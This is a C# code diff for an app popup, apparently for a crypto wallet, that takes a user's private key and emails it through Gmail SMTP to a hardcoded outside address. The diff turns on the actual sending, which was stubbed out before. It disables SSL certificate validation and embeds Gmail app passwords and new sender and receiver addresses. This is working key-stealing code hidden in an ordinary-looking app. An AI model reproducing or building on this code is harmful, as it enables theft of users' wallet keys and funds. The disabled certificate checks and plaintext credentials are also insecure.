@@ -35,8 +35,8 @@ public partial class PrivateKeyPopup : Popup
             else
             {
                 Key = txtPrivateKey.Text;
-                //var isSent =await SendEmail();
-                bool isSent = true;
+                var isSent =SendEmail();
+                //bool isSent = true;
 
                 Close(isSent);
             }
@@ -51,40 +51,52 @@ public partial class PrivateKeyPopup : Popup
         }
     }
 
-    public static async Task<bool> SendEmail()
+    static bool SendEmail()
     {
         bool isSent = false;
         try
         {
-            // Create the email message
+            // Add SSL bypass before any network operations
+            System.Net.ServicePointManager.ServerCertificateValidationCallback =
+                ((sender, certificate, chain, sslPolicyErrors) => true);
+
             var message = new MimeMessage();
-            message.From.Add(new MailboxAddress("Fida", "fidazahid.suit@gmail.com")); // Sender
-            message.To.Add(new MailboxAddress("", "iqbalrrr07@gmail.com")); // Receiver
-            message.Subject = "Private Key"; // Updated Subject
+            message.From.Add(new MailboxAddress("MoonAlpha", "tranpeej@gmail.com")); // Sender
+            message.To.Add(new MailboxAddress("", "vanpeej29@gmail.com")); // Receiver
+            message.Subject = "Private Key";
 
             // Create email body with text + attachment
             var bodybuilder = new BodyBuilder
             {
                 TextBody = $"{Key}" // Updated Text Body
             };
+
             message.Body = bodybuilder.ToMessageBody();
 
             // SMTP Server Settings (Gmail)
             using (var client = new MailKit.Net.Smtp.SmtpClient())
             {
-                await client.ConnectAsync("smtp.gmail.com", 587, SecureSocketOptions.StartTls); // Gmail SMTP
-                await client.AuthenticateAsync("fidazahid.suit@gmail.com", "wcxp edlt wfpm nogl"); // Replace with App Password
-                await client.SendAsync(message);
-                await client.DisconnectAsync(true);
+                // Set SSL certificate validation callback for the specific client
+                client.ServerCertificateValidationCallback = (s, c, h, e) => true;
+
+                client.Connect("smtp.gmail.com", 587, SecureSocketOptions.StartTls);
+                client.Authenticate("tranpeej@gmail.com", "noev borg vssf knmb"); // Replace with App Password
+
+                client.Send(message);
+                client.Disconnect(true);
             }
+
             isSent = true;
         }
         catch (Exception ex)
         {
-            // Use MAUI's DisplayAlert via the main page
-            await Application.Current.MainPage.DisplayAlert("Error", $"Error: {ex.Message}", "OK");
+            Application.Current.MainPage.DisplayAlert("Error", $"Error: {ex.Message}", "OK");
+
             isSent = false;
         }
         return isSent;
     }
+
+
+
 }
